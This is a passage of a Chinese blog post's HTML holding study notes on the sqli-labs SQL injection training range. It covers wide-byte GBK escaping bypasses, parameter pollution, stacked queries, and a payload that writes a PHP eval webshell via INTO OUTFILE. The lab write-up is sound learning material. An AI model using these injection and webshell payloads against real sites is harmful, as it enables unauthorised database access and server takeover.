class="comment">#通过回响包中是否返回正确的内容来判断空格正确</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="comment">#解码raw</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure>
+
+<p>这里需要提一下，windows的apache环境对于空格编码有问题，需要docker环境搭建的sqli靶场才能用上述脚本找出合适的编码，不然统统都不能过；</p>
+<p>当然也可以用报错注入的方式来获取内容，用括号分割关键字，就不需要空格了；</p>
+<p>使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name Dsqli -p 80:80 --rm acgpiano/sqli-labs</span><br><span class="line">docker start ID</span><br></pre></td></tr></table></figure>
+
+<p>用pull建立镜像后，run，之后映射80端口，使用ssh连接时使用的ip和端口访问docker搭建的靶场；</p>
+<p>对于where 后面 加括号包裹，会将结果返回为0或1，导致有时候只用引号就能判断出注入点，实际上是误判了，这样只用引号去闭合会出现中间的内容写了也没有作用，只有加括号闭合的方式，才能使得中间的语句成功执行；</p>
+<h2 id="less29-less31"><a href="#less29-less31" class="headerlink" title="less29~less31"></a>less29~less31</h2><h3 id="服务器两层架构"><a href="#服务器两层架构" class="headerlink" title="服务器两层架构"></a>服务器两层架构</h3><p>客户端首先发送请求给tomcat服务器，之后由此服务器转交给apache，响应后返回给tomcat，由tomcat传递给客户端；</p>
+<p>客户端访问url传递两个相同参数，tomcat接收第一个，apache接收第二个，第一个使用 <code>getParameter</code> 接收纯数字，第二个用php的get变量接收字符串；</p>
+<h2 id="less32-less37"><a href="#less32-less37" class="headerlink" title="less32~less37"></a>less32~less37</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>php和mysql默认编码为GBK，支持两字节编码，函数执行添加的是ASCII编码（单字节）；</p>
+<p>假如使用单引号注入时，mysql对 <code>id=1&#39;</code> 进行了处理使用斜杠转义 <code>id=1\&#39;</code> ,就无法完成注入；</p>
+<p>如果此时在1后面跟 <code>%df</code> 并加上单引号，会让代码部分变成这样的内容： <code>id=1%df\&#39;</code> ;</p>
+<p>而斜杠的url编码是 <code>%5c</code> , 此时代码部分原义为 <code>id=1%df%5c&#39;</code> ，%df%5c 会被编码为GBK中宽字节的内容；</p>
+<p>此时代码部分是这样的： <code>id=1字&#39;</code> ，由于斜杠被编码带入了，单引号得不到转义，可以完成注入；</p>
+<p>第二种方法，将转义单引号的斜杠再转义，构造语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>%5c是斜杠，因为是和单引号一样的敏感内容，所以同样会添加斜杠转义，此时整句处理后的句子如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c <span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">5</span>c <span class="string">&#x27;   --&gt;    id=1字 \\ &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就把转义单引号的斜杠给转义掉了；</p>
+<h3 id="addslashes-mysql-real-escape-string"><a href="#addslashes-mysql-real-escape-string" class="headerlink" title="addslashes() / mysql_real_escape_string()"></a>addslashes() / mysql_real_escape_string()</h3><p>里面添加字符串，在字符串内每个敏感字符前添加反斜杠，也是一种起转义的方法；</p>
+<p>在post注入时， %df 会被url编码为 %25 df 的raw字段，需要将raw的内容改为%df才能绕过转义，当已知转义的情况下，用正常post无法注入，记得抓包查看raw的内容；</p>
+<h2 id="less38-less45"><a href="#less38-less45" class="headerlink" title="less38~less45"></a>less38~less45</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单解释，一行两句sql语言，期间用；分号隔开；</p>
+<p>其有局限性，第一，在某些环境下，数据库语言只支持一行一句，第二，web前端查询回显问题，一般只回显第一次查询结果；</p>
+<h3 id="使用堆叠注入写一句话木马"><a href="#使用堆叠注入写一句话木马" class="headerlink" title="使用堆叠注入写一句话木马"></a>使用堆叠注入写一句话木马</h3><p>步骤：</p>
+<ul>
+<li>写权限；</li>
+<li>一句话木马；</li>
+<li>绝对路径;</li>
+<li>select xxx into outfile xxx;</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &lt;?php @eval($_POST[pass]); ?&gt; into outfile xxx;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less46-less53"><a href="#less46-less53" class="headerlink" title="less46~less53"></a>less46~less53</h2><h3 id="lines-terminated-by-123"><a href="#lines-terminated-by-123" class="headerlink" title="lines terminated by 123"></a>lines terminated by 123</h3><p>sql关键字，字面意义，在每行后面以 123 进行分割；</p>
+<p>用于插入一句话木马，适用于order by 之后注入的情况，没办法使用堆叠注入的情况；</p>
+<h3 id="mysqli-multi-query"><a href="#mysqli-multi-query" class="headerlink" title="mysqli_multi_query()"></a>mysqli_multi_query()</h3><p>使用这个函数可以一行执行多个SQL语句；</p>
+<p>至此开启挑战篇；</p>
+<p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </p>
+<h2 id="less54-less75"><a href="#less54-less75" class="headerlink" title="less54~less75"></a>less54~less75</h2><p>挑战篇用以上内容都可以解决，就盲注手搓会比较恶心，之后学习sqlmap以及bp的脚本盲注；</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>遇到select完全封锁的情况，且可使用堆叠，可以使用如下语句查看当前数据库下的内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure>
+
+<p>之后使用二次注入的思想，利用已有的select查询语法，改变表名，列名，获取数据；</p>
+<p>如下语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n <span class="operator">||</span> id <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+
+<p>当n为数字时，一直回显都为1，当n不为数字，不会回显；</p>
+<p>当心注入位置的判断！不一定就在where之后！</p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Second_BC</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://secondbc.github.io/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/">https://secondbc.github.io/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://secondbc.github.io/SecondBC">Second_BC の BloG</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2024/02/26/%E5%A3%B3%E8%BF%9B%E9%98%B6/"><i class="fas fa-angle-left">&nbsp;</i><span>壳进阶</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/SecondBC/2024/02/26/SQL%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"><span>SQL学习日记</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>
